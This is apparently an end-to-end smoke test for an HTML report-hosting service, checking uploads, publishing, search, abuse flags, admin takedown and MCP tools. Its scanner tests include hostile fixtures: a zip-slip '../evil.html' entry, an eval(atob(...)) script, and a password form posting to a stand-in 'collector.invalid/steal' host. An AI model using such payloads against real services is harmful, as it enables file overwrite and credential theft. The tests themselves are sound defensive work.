/**
 * E2E smoke test against a running local dev server.
 *
 *   HRB_DATA_DIR=/tmp/e2e bun run seed
 *   HRB_DATA_DIR=/tmp/e2e bun packages/api/src/local/server.ts &
 *   bun scripts/smoke.ts            # SMOKE_BASE_URL to override :3000
 *
 * Covers: config → seed list → search → upload (html + zip → private →
 * publish) → content serving → scanner verdicts (block: eval+atob / zip-slip
 * / phishing combo, warn: private + owner self-publish) → unpublish/republish
 * + source + direct HTML edit → overwrite (version+1, stale search postings
 * swept) → abuse flags (+rate limit, admin flagged list/clear) → admin
 * takedown → authz denials → delete → MCP search/get/list → SPA.
 */
const BASE = process.env.SMOKE_BASE_URL ?? "http://localhost:3000";
const RUN = Date.now().toString(36); // unique per run; survives reruns on a dirty data dir
let failures = 0;

function check(name: string, ok: boolean, detail: string) {
  console.log(`${ok ? "PASS" : "FAIL"} ${name}: ${detail}`);
  if (!ok) failures++;
}

const alice = { "x-dev-user": "alice", "content-type": "application/json" };
const bob = { "x-dev-user": "bob", "content-type": "application/json" };
const admin = { "x-dev-user": "admin", "content-type": "application/json" };

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

async function json(res: Response): Promise<Record<string, any>> {
  try {
    return (await res.json()) as Record<string, any>;
  } catch {
    return {};
  }
}

/**
 * Full upload flow: create (or issue overwrite upload-url) → POST the bytes
 * to the presigned target → complete. Returns the terminal step + body.
 */
async function uploadFlow(opts: {
  title?: string;
  kind: "html" | "zip";
  data: Uint8Array | string;
  filename?: string;
  overwriteId?: string;
  headers?: Record<string, string>;
}) {
  const headers = opts.headers ?? alice;
  let id: string;
  let upload: {
    url: string;
    method?: "post" | "put";
    key?: string;
    fields?: Record<string, string>;
    headers?: Record<string, string>;
  };
  if (opts.overwriteId) {
    id = opts.overwriteId;
    const res = await fetch(`${BASE}/api/reports/${id}/upload-url`, {
      method: "POST",
      headers,
      body: JSON.stringify({ kind: opts.kind }),
    });
    const body = await json(res);
    if (res.status !== 200) return { step: "upload-url", status: res.status, id, body } as const;
    upload = body.upload;
  } else {
    const res = await fetch(`${BASE}/api/reports`, {
      method: "POST",
      headers,
      body: JSON.stringify({ title: opts.title, kind: opts.kind }),
    });
    const body = await json(res);
    if (res.status !== 201 && res.status !== 200) {
      return { step: "create", status: res.status, body } as const;
    }
    id = body.report.id;
    upload = body.upload;
  }
  const bytes = typeof opts.data === "string" ? new TextEncoder().encode(opts.data) : opts.data;
  const mime = opts.kind === "zip" ? "application/zip" : "text/html";
  // upload.url is origin-relative in local mode ("/local-upload").
  let upRes: Response;
  let stagingKey: string;
  if (upload.method === "put") {
    // R2 等: presigned PUT に生バイトを送り、付随ヘッダーを適用する。
    stagingKey = upload.key ?? "";
    upRes = await fetch(new URL(upload.url, BASE), {
      method: "PUT",
      headers: { "content-type": mime, ...(upload.headers ?? {}) },
      body: bytes as Uint8Array<ArrayBuffer>,
    });
  } else {
    const form = new FormData();
    for (const [k, v] of Object.entries(upload.fields ?? {})) form.set(k, v);
    form.set("file", new Blob([bytes as Uint8Array<ArrayBuffer>], { type: mime }), opts.filename ?? `report.${opts.kind}`);
    stagingKey = upload.fields?.key ?? "";
    upRes = await fetch(new URL(upload.url, BASE), { method: "POST", body: form });
  }
  if (upRes.status !== 204) return { step: "upload", status: upRes.status, id } as const;
  const compRes = await fetch(`${BASE}/api/reports/${id}/complete`, {
    method: "POST",
    headers,
    body: JSON.stringify({ key: stagingKey }),
  });
  return { step: "complete", status: compRes.status, id, body: await json(compRes) } as const;
}

/** POST /api/reports/:id/publish（新モデル: complete は private で終わる） */
async function publishReport(id: string, headers: Record<string, string> = alice) {
  const res = await fetch(`${BASE}/api/reports/${id}/publish`, { method: "POST", headers });
  return { status: res.status, body: await json(res) };
}

async function searchIds(q: string): Promise<string[]> {
  const res = await fetch(`${BASE}/api/search?q=${encodeURIComponent(q)}`);
  const body = await json(res);
  return ((body.results ?? []) as any[]).map((r) => r.report?.id ?? r.id);
}

// ---- minimal ZIP writer (stored entries, method 0) — for dynamic fixtures ----

const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();

function crc32(data: Uint8Array): number {
  let c = 0xffffffff;
  for (let i = 0; i < data.length; i++) c = CRC_TABLE[(c ^ data[i]!) & 0xff]! ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

/** Build a zip with stored (uncompressed) entries. Entry paths are written verbatim (zip-slip fixtures included). */
function makeZip(entries: Array<{ path: string; data: Uint8Array | string }>): Uint8Array {
  const enc = new TextEncoder();
  const locals: Uint8Array[] = [];
  const centrals: Uint8Array[] = [];
  let offset = 0;
  for (const entry of entries) {
    const name = enc.encode(entry.path);
    const data = typeof entry.data === "string" ? enc.encode(entry.data) : entry.data;
    const crc = crc32(data);
    const local = new Uint8Array(30 + name.length + data.length);
    const lv = new DataView(local.buffer);
    lv.setUint32(0, 0x04034b50, true);
    lv.setUint16(4, 20, true); // version needed
    lv.setUint16(8, 0, true); // method: stored
    lv.setUint32(14, crc, true);
    lv.setUint32(18, data.length, true); // compressed
    lv.setUint32(22, data.length, true); // uncompressed
    lv.setUint16(26, name.length, true);
    local.set(name, 30);
    local.set(data, 30 + name.length);
    locals.push(local);

    const central = new Uint8Array(46 + name.length);
    const cv = new DataView(central.buffer);
    cv.setUint32(0, 0x02014b50, true);
    cv.setUint16(4, 20, true); // version made by
    cv.setUint16(6, 20, true); // version needed
    cv.setUint16(10, 0, true); // method
    cv.setUint32(16, crc, true);
    cv.setUint32(20, data.length, true);
    cv.setUint32(24, data.length, true);
    cv.setUint16(28, name.length, true);
    cv.setUint32(42, offset, true); // local header offset
    central.set(name, 46);
    centrals.push(central);
    offset += local.length;
  }
  const centralSize = centrals.reduce((n, c) => n + c.length, 0);
  const eocd = new Uint8Array(22);
  const ev = new DataView(eocd.buffer);
  ev.setUint32(0, 0x06054b50, true);
  ev.setUint16(8, entries.length, true);
  ev.setUint16(10, entries.length, true);
  ev.setUint32(12, centralSize, true);
  ev.setUint32(16, offset, true);
  const out = new Uint8Array(offset + centralSize + 22);
  let pos = 0;
  for (const chunk of [...locals, ...centrals, eocd]) {
    out.set(chunk, pos);
    pos += chunk.length;
  }
  return out;
}

const PNG_1PX = Uint8Array.from(
  atob("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="),
  (c) => c.charCodeAt(0),
);

// ---- MCP JSON-RPC helper (handles both JSON and SSE response bodies) ----

let mcpRpcId = 0;
async function mcpCall(method: string, params: unknown): Promise<Record<string, any>> {
  const res = await fetch(`${BASE}/mcp`, {
    method: "POST",
    headers: { "content-type": "application/json", accept: "application/json, text/event-stream" },
    body: JSON.stringify({ jsonrpc: "2.0", id: ++mcpRpcId, method, params }),
  });
  const ct = res.headers.get("content-type") ?? "";
  if (ct.includes("text/event-stream")) {
    const text = await res.text();
    const dataLines = text.split("\n").filter((l) => l.startsWith("data:"));
    const last = dataLines[dataLines.length - 1];
    return last ? (JSON.parse(last.slice(5).trim()) as Record<string, any>) : {};
  }
  return json(res);
}

/** tools/call responses embed a JSON string in result.content[0].text. */
function toolJson(rpc: Record<string, any>): Record<string, any> {
  try {
    return JSON.parse(rpc.result?.content?.[0]?.text ?? "{}");
  } catch {
    return {};
  }
}

// ===========================================================================
// 1. public reads: config / seeded list / search
// ===========================================================================

{
  const res = await fetch(`${BASE}/api/config`);
  const body = await json(res);
  const ok = res.status === 200 && typeof body.contentBaseUrl === "string" && body.auth?.mode === "dev";
  check("GET /api/config", ok, `${res.status} ${JSON.stringify(body).slice(0, 160)}`);
}

{
  const res = await fetch(`${BASE}/api/reports`);
  const body = await json(res);
  const n = (body.reports ?? []).length;
  // seed はデモ用に 2 件公開 + 1 件非公開を投入する
  check("GET /api/reports (seed, published only)", res.status === 200 && n >= 2, `${res.status} reports=${n}`);
}

{
  const ids = await searchIds("売上");
  check("GET /api/search?q=売上 (seed)", ids.length >= 1, `hits=${ids.length}`);
}

// ===========================================================================
// 2. benign HTML upload → private → owner publish → /r/ serving
// ===========================================================================

const htmlV1 = `<!doctype html><html><head><title>smoke html ${RUN}</title></head><body><h1>スモーク良性HTML</h1><p>oldtok${RUN}</p></body></html>`;
const benign = await uploadFlow({ title: `smoke 良性HTML ${RUN}`, kind: "html", data: htmlV1 });
const htmlId = benign.id ?? "";
{
  const r = (benign as any).body?.report;
  check(
    "html upload → private (v1, pass)",
    benign.step === "complete" && benign.status === 200 && r?.status === "private" && r?.version === 1 && r?.verdict === "pass",
    `step=${benign.step} http=${benign.status} status=${r?.status} version=${r?.version} verdict=${r?.verdict}`,
  );
  const beforePublish = await fetch(`${BASE}/r/${htmlId}/`);
  const pub = await publishReport(htmlId);
  check(
    "owner publish → published + url (content 404 until then)",
    beforePublish.status === 404 && pub.status === 200 && pub.body.report?.status === "published" && typeof pub.body.url === "string",
    `before=${beforePublish.status} publish=${pub.status}→${pub.body.report?.status} url=${pub.body.url}`,
  );
}

{
  const res = await fetch(`${BASE}/r/${htmlId}/`);
  const text = await res.text();
  check(
    "GET /r/<id>/ (html)",
    res.status === 200 && text.includes(`oldtok${RUN}`) && (res.headers.get("content-type") ?? "").includes("text/html"),
    `${res.status} ct=${res.headers.get("content-type")} len=${text.length}`,
  );
  const dot = await fetch(`${BASE}/r/${htmlId}/.extracted.txt`);
  check("GET /r/<id>/.extracted.txt → 404", dot.status === 404, `${dot.status}`);
}

// ===========================================================================
// 3. benign ZIP (root index.html + css + png) → published, assets served
// ===========================================================================

const zipBenign = makeZip([
  {
    path: "index.html",
    data: `<!doctype html><html><head><title>smoke zip ${RUN}</title><link rel="stylesheet" href="assets/style.css"></head><body><h1>Zipレポート</h1><img src="assets/logo.png" alt=""><p>zipbody${RUN}</p></body></html>`,
  },
  { path: "assets/style.css", data: "body { color: #1a1a2e; }" },
  { path: "assets/logo.png", data: PNG_1PX },
]);
const zipUp = await uploadFlow({ title: `smoke 良性ZIP ${RUN}`, kind: "zip", data: zipBenign });
const zipId = zipUp.id ?? "";
{
  const r = (zipUp as any).body?.report;
  const pub = await publishReport(zipId);
  check(
    "zip upload → private → publish",
    zipUp.step === "complete" && zipUp.status === 200 && r?.status === "private" && r?.kind === "zip" && pub.status === 200 && pub.body.report?.status === "published",
    `step=${zipUp.step} http=${zipUp.status} status=${r?.status} kind=${r?.kind} publish=${pub.status} findings=${JSON.stringify(r?.findings)?.slice(0, 160)}`,
  );
}

{
  const page = await fetch(`${BASE}/r/${zipId}/`);
  const pageText = await page.text();
  const css = await fetch(`${BASE}/r/${zipId}/assets/style.css`);
  const png = await fetch(`${BASE}/r/${zipId}/assets/logo.png`);
  const pngBytes = new Uint8Array(await png.arrayBuffer());
  check(
    "GET /r/<id>/ zip page + assets",
    page.status === 200 &&
      pageText.includes(`zipbody${RUN}`) &&
      css.status === 200 &&
      (css.headers.get("content-type") ?? "").includes("text/css") &&
      png.status === 200 &&
      (png.headers.get("content-type") ?? "").includes("image/png") &&
      pngBytes[0] === 0x89,
    `page=${page.status} css=${css.status}(${css.headers.get("content-type")}) png=${png.status}(${png.headers.get("content-type")})`,
  );
}

// ===========================================================================
// 4. hostile uploads → block/rejected
// ===========================================================================

// NOTE: every "malicious" payload below is an inert STRING fixture uploaded to
// verify the scanner rejects it — nothing here is ever executed.

// 4a. zip-slip (../ traversal entry)
const zipSlip = makeZip([
  { path: "../evil.html", data: "<!doctype html><html><body>slip</body></html>" },
  { path: "index.html", data: "<!doctype html><html><body>ok</body></html>" },
]);
{
  const res = await uploadFlow({ title: `smoke zip-slip ${RUN}`, kind: "zip", data: zipSlip });
  const r = (res as any).body?.report;
  const findings = JSON.stringify(r?.findings ?? []);
  check(
    "zip-slip zip → rejected (block)",
    res.step === "complete" && r?.status === "rejected" && r?.verdict === "block" && findings.includes("zip-slip"),
    `step=${res.step} status=${r?.status} verdict=${r?.verdict} findings=${findings.slice(0, 200)}`,
  );
}

// 4b. eval+atob decode-exec chain
{
  const res = await uploadFlow({
    title: `smoke eval+atob ${RUN}`,
    kind: "html",
    data: `<!doctype html><html><head><title>evil</title></head><body><script>eval(atob("YWxlcnQoJ3B3bmVkJyk7YWxlcnQoJ3B3bmVkJyk7YWxlcnQoJ3B3bmVkJyk7"));</script></body></html>`,
  });
  const r = (res as any).body?.report;
  check(
    "eval+atob html → rejected (block)",
    res.step === "complete" && r?.status === "rejected" && r?.verdict === "block",
    `step=${res.step} status=${r?.status} verdict=${r?.verdict}`,
  );
}

// 4c. password input + external form action = credential phishing → block
{
  const res = await uploadFlow({
    title: `smoke phishing combo ${RUN}`,
    kind: "html",
    data: `<!doctype html><html><head><title>login</title></head><body><form action="https://collector.invalid/steal" method="post"><input type="password" name="p"><button>Send</button></form></body></html>`,
  });
  const r = (res as any).body?.report;
  const findings = JSON.stringify(r?.findings ?? []);
  check(
    "password+external-action form → rejected (phishing-form block)",
    res.step === "complete" && r?.status === "rejected" && r?.verdict === "block" && findings.includes("phishing-form"),
    `step=${res.step} status=${r?.status} verdict=${r?.verdict} findings=${findings.slice(0, 200)}`,
  );
}

// ===========================================================================
// 5. warn → private（findings 付き）→ オーナー自身が公開（管理者承認は不要）
//    (external form action WITHOUT password: warn by design; adding a
//     password upgrades it to the phishing-form BLOCK verified in 4c)
// ===========================================================================

const warnUp = await uploadFlow({
  title: `smoke warn ${RUN}`,
  kind: "html",
  data: `<!doctype html><html><head><title>warn survey ${RUN}</title></head><body><h1>アンケート</h1><form action="https://survey.invalid/collect" method="post"><input type="text" name="answer"><button>送信</button></form><p>warnbody${RUN}</p></body></html>`,
});
const warnId = warnUp.id ?? "";
{
  const r = (warnUp as any).body?.report;
  const findings = JSON.stringify(r?.findings ?? []);
  check(
    "external-action form → private (warn, findings preserved)",
    warnUp.step === "complete" && r?.status === "private" && r?.verdict === "warn" && findings.includes("external-form-action"),
    `step=${warnUp.step} status=${r?.status} verdict=${r?.verdict} findings=${findings.slice(0, 200)}`,
  );
}

{
  const anon = await fetch(`${BASE}/api/reports/${warnId}`);
  const content = await fetch(`${BASE}/r/${warnId}/`);
  const owner = await fetch(`${BASE}/api/reports/${warnId}`, { headers: alice });
  check(
    "private hidden (anon 404, content 404, owner 200)",
    anon.status === 404 && content.status === 404 && owner.status === 200,
    `anon=${anon.status} content=${content.status} owner=${owner.status}`,
  );
}

{
  const pub = await publishReport(warnId);
  const served = await fetch(`${BASE}/r/${warnId}/`);
  const servedText = await served.text();
  const hits = await searchIds(`warnbody${RUN}`);
  check(
    "owner publish (warn): private → published + served + indexed",
    pub.status === 200 && pub.body.report?.status === "published" && pub.body.report?.verdict === "warn" && served.status === 200 && servedText.includes(`warnbody${RUN}`) && hits.includes(warnId),
    `publish=${pub.status}→${pub.body.report?.status} served=${served.status} searchHit=${hits.includes(warnId)}`,
  );
}

// ===========================================================================
// 5.5 unpublish/republish + source + direct HTML edit
// ===========================================================================

{
  const un = await fetch(`${BASE}/api/reports/${htmlId}/unpublish`, { method: "POST", headers: alice });
  const unBody = await json(un);
  const hidden = await fetch(`${BASE}/r/${htmlId}/`);
  const anonMeta = await fetch(`${BASE}/api/reports/${htmlId}`);
  const hits = await searchIds(`oldtok${RUN}`);
  const src = await fetch(`${BASE}/api/reports/${htmlId}/source`, { headers: alice });
  const srcBody = await json(src);
  const srcDenied = await fetch(`${BASE}/api/reports/${htmlId}/source`, { headers: bob });
  check(
    "unpublish → hidden everywhere, source still readable by owner only",
    un.status === 200 && unBody.report?.status === "private" && hidden.status === 404 && anonMeta.status === 404 && hits.length === 0 && src.status === 200 && String(srcBody.html ?? "").includes(`oldtok${RUN}`) && srcDenied.status === 403,
    `unpublish=${un.status}→${unBody.report?.status} content=${hidden.status} meta=${anonMeta.status} hits=${hits.length} source=${src.status} sourceDenied=${srcDenied.status}`,
  );
  const re = await publishReport(htmlId);
  const back = await fetch(`${BASE}/r/${htmlId}/`);
  check(
    "republish → served again",
    re.status === 200 && re.body.report?.status === "published" && back.status === 200,
    `publish=${re.status}→${re.body.report?.status} content=${back.status}`,
  );
}

{
  const editRes = await fetch(`${BASE}/api/reports/${htmlId}/content`, {
    method: "PUT",
    headers: alice,
    body: JSON.stringify({
      html: `<!doctype html><html><head><title>smoke html edited ${RUN}</title></head><body><h1>直接編集版</h1><p>edittok${RUN}</p></body></html>`,
    }),
  });
  const edit = await json(editRes);
  const served = await fetch(`${BASE}/r/${htmlId}/`);
  const servedText = await served.text();
  const hits = await searchIds(`edittok${RUN}`);
  check(
    "direct HTML edit → version+1, re-scanned, published content updated",
    editRes.status === 200 && edit.report?.version === 2 && edit.report?.status === "published" && served.status === 200 && servedText.includes(`edittok${RUN}`) && hits.includes(htmlId),
    `edit=${editRes.status} version=${edit.report?.version} status=${edit.report?.status} served=${servedText.includes(`edittok${RUN}`)} indexed=${hits.includes(htmlId)}`,
  );
}

// ===========================================================================
// 6. overwrite: version+1, stale search postings swept, content replaced
// ===========================================================================

{
  const before = await searchIds(`edittok${RUN}`);
  check("search finds edited body token before overwrite", before.includes(htmlId), `hits=${JSON.stringify(before)}`);
}

{
  const res = await uploadFlow({
    overwriteId: htmlId,
    kind: "html",
    data: `<!doctype html><html><head><title>smoke html v3 ${RUN}</title></head><body><h1>上書き版</h1><p>newtok${RUN}</p></body></html>`,
  });
  const r = (res as any).body?.report;
  check(
    "overwrite of published report → stays published, version 3",
    res.step === "complete" && res.status === 200 && r?.status === "published" && r?.version === 3,
    `step=${res.step} http=${res.status} status=${r?.status} version=${r?.version}`,
  );
  const oldHits = await searchIds(`edittok${RUN}`);
  const newHits = await searchIds(`newtok${RUN}`);
  const served = await fetch(`${BASE}/r/${htmlId}/`);
  const servedText = await served.text();
  check(
    "overwrite sweeps old postings + indexes/serves new content",
    oldHits.length === 0 && newHits.includes(htmlId) && served.status === 200 && servedText.includes(`newtok${RUN}`) && !servedText.includes(`edittok${RUN}`),
    `oldHits=${oldHits.length} newHit=${newHits.includes(htmlId)} served=${served.status} v3Body=${servedText.includes(`newtok${RUN}`)}`,
  );
}

// ===========================================================================
// 7. abuse flags (通報): unauthenticated, per-IP rate limited, admin-visible
// ===========================================================================

{
  const ip = `203.0.113.${(Date.now() % 200) + 1}`; // unique-ish per run (limiter is per-process anyway)
  const flagHeaders = { "content-type": "application/json", "x-forwarded-for": ip };
  const statuses: number[] = [];
  for (let i = 0; i < 6; i++) {
    const res = await fetch(`${BASE}/api/reports/${zipId}/flag`, {
      method: "POST",
      headers: flagHeaders,
      body: JSON.stringify({ reason: `不審なレポートです (${i + 1}/6) ${RUN}` }),
    });
    statuses.push(res.status);
  }
  check(
    "flag: 5 accepted, 6th rate-limited (429)",
    statuses.slice(0, 5).every((s) => s === 200) && statuses[5] === 429,
    `statuses=${statuses.join(",")}`,
  );
  const anonList = await fetch(`${BASE}/api/reports/${zipId}/flag`, { method: "POST", headers: { "content-type": "application/json" }, body: "{" });
  check("flag: malformed JSON → 400", anonList.status === 400, `${anonList.status}`);
  const flagsRes = await fetch(`${BASE}/api/admin/reports/${zipId}/flags`, { headers: admin });
  const flags = await json(flagsRes);
  const mine = ((flags.flags ?? []) as any[]).filter((f) => String(f.reason).includes(RUN));
  const denied = await fetch(`${BASE}/api/admin/reports/${zipId}/flags`, { headers: alice });
  check(
    "admin sees flags (5), non-admin denied (403)",
    flagsRes.status === 200 && mine.length === 5 && denied.status === 403,
    `admin=${flagsRes.status} flags=${mine.length} nonAdmin=${denied.status}`,
  );

  // 通報一覧（管理画面の新キュー）に載り、解決でクリアできる
  const flaggedRes = await fetch(`${BASE}/api/admin/flagged`, { headers: admin });
  const flagged = await json(flaggedRes);
  const entry = ((flagged.items ?? []) as any[]).find((i) => i.report?.id === zipId);
  const clearRes = await fetch(`${BASE}/api/admin/reports/${zipId}/flags`, { method: "DELETE", headers: admin });
  const flaggedAfter = await json(await fetch(`${BASE}/api/admin/flagged`, { headers: admin }));
  const stillThere = ((flaggedAfter.items ?? []) as any[]).some((i) => i.report?.id === zipId);
  check(
    "admin flagged list: zip report listed, clear resolves it",
    flaggedRes.status === 200 && entry !== undefined && entry.flags.length >= 5 && clearRes.status === 200 && !stillThere,
    `flagged=${flaggedRes.status} entryFlags=${entry?.flags?.length} clear=${clearRes.status} after=${stillThere}`,
  );
}

// ===========================================================================
// 8. admin takedown: unpublish + purge, META kept for audit
// ===========================================================================

{
  const res = await fetch(`${BASE}/api/admin/reports/${zipId}/takedown`, { method: "POST", headers: admin });
  const body = await json(res);
  const content = await fetch(`${BASE}/r/${zipId}/`);
  const pubList = await json(await fetch(`${BASE}/api/reports?limit=100`));
  const stillListed = ((pubList.reports ?? []) as any[]).some((r) => r.id === zipId);
  const hits = await searchIds(`zipbody${RUN}`);
  const adminView = await fetch(`${BASE}/api/reports/${zipId}`, { headers: admin });
  check(
    "admin takedown → status=takedown, content purged, unlisted, unindexed, META kept",
    res.status === 200 && body.report?.status === "takedown" && content.status === 404 && !stillListed && hits.length === 0 && adminView.status === 200,
    `takedown=${res.status}→${body.report?.status} content=${content.status} listed=${stillListed} searchHits=${hits.length} adminView=${adminView.status}`,
  );
}

// ===========================================================================
// 9. authz denials
// ===========================================================================

{
  const bobDelete = await fetch(`${BASE}/api/reports/${htmlId}`, { method: "DELETE", headers: bob });
  const aliceAdmin = await fetch(`${BASE}/api/admin/reports`, { headers: alice });
  const anonCreate = await fetch(`${BASE}/api/reports`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ title: "anon", kind: "html" }),
  });
  check(
    "authz: non-owner delete 403 / non-admin admin-route 403 / anon create 401",
    bobDelete.status === 403 && aliceAdmin.status === 403 && anonCreate.status === 401,
    `bobDelete=${bobDelete.status} aliceAdmin=${aliceAdmin.status} anonCreate=${anonCreate.status}`,
  );
}

// ===========================================================================
// 10. MCP: initialize / tools list / search / get / list_recent
// ===========================================================================

{
  const init = await mcpCall("initialize", {
    protocolVersion: "2025-03-26",
    capabilities: {},
    clientInfo: { name: "smoke", version: "0.0.1" },
  });
  check("MCP initialize", init.result?.serverInfo?.name === "html-report-box", `serverInfo=${JSON.stringify(init.result?.serverInfo)}`);

  const list = await mcpCall("tools/list", {});
  const names = ((list.result?.tools ?? []) as any[]).map((t) => t.name).sort();
  check("MCP tools/list", names.join(",") === "get_report,list_recent_reports,search_reports", `tools=${names.join(",")}`);

  const search = toolJson(await mcpCall("tools/call", { name: "search_reports", arguments: { query: `newtok${RUN}` } }));
  const hit = ((search.results ?? []) as any[]).find((r) => r.id === htmlId);
  check("MCP search_reports", hit !== undefined && typeof hit.url === "string", `hits=${(search.results ?? []).length} url=${hit?.url}`);

  const got = toolJson(await mcpCall("tools/call", { name: "get_report", arguments: { id: htmlId } }));
  check(
    "MCP get_report (meta + extracted text)",
    got.report?.id === htmlId && got.report?.version === 3 && String(got.extractedText ?? "").includes(`newtok${RUN}`),
    `id=${got.report?.id} version=${got.report?.version} textHasToken=${String(got.extractedText ?? "").includes(`newtok${RUN}`)}`,
  );

  const notFoundRpc = await mcpCall("tools/call", { name: "get_report", arguments: { id: "no-such-report-id-000" } });
  check("MCP get_report unknown id → isError", notFoundRpc.result?.isError === true, `isError=${notFoundRpc.result?.isError}`);

  const recent = toolJson(await mcpCall("tools/call", { name: "list_recent_reports", arguments: { limit: 50 } }));
  const ids = ((recent.reports ?? []) as any[]).map((r) => r.id);
  check(
    "MCP list_recent_reports (published only)",
    ids.includes(htmlId) && ids.includes(warnId) && !ids.includes(zipId),
    `count=${ids.length} hasHtml=${ids.includes(htmlId)} hasWarn=${ids.includes(warnId)} hasTakedown=${ids.includes(zipId)}`,
  );
}

// ===========================================================================
// 11. delete → gone everywhere
// ===========================================================================

{
  const del = await fetch(`${BASE}/api/reports/${htmlId}`, { method: "DELETE", headers: alice });
  const meta = await fetch(`${BASE}/api/reports/${htmlId}`);
  const content = await fetch(`${BASE}/r/${htmlId}/`);
  const hits = await searchIds(`newtok${RUN}`);
  check(
    "owner delete → meta 404, content 404, unindexed",
    del.status === 200 && meta.status === 404 && content.status === 404 && hits.length === 0,
    `delete=${del.status} meta=${meta.status} content=${content.status} searchHits=${hits.length}`,
  );
}

// cleanup: delete remaining run fixtures so reruns against a persistent
// data dir don't accumulate (rejected/takedown/warn reports stay for audit
// in real life; here we only remove what this run created and still owns).
{
  await fetch(`${BASE}/api/reports/${warnId}`, { method: "DELETE", headers: alice });
}

// ===========================================================================
// 12. SPA shell
// ===========================================================================

{
  const res = await fetch(`${BASE}/`);
  const text = await res.text();
  const ok = res.status === 200 && (res.headers.get("content-type") ?? "").includes("text/html") && text.includes("<script");
  check("GET / (SPA via HTML import)", ok, `${res.status} ct=${res.headers.get("content-type")} len=${text.length}`);
}

console.log(failures === 0 ? "SMOKE: ALL PASS" : `SMOKE: ${failures} FAILURE(S)`);
process.exit(failures === 0 ? 0 : 1);
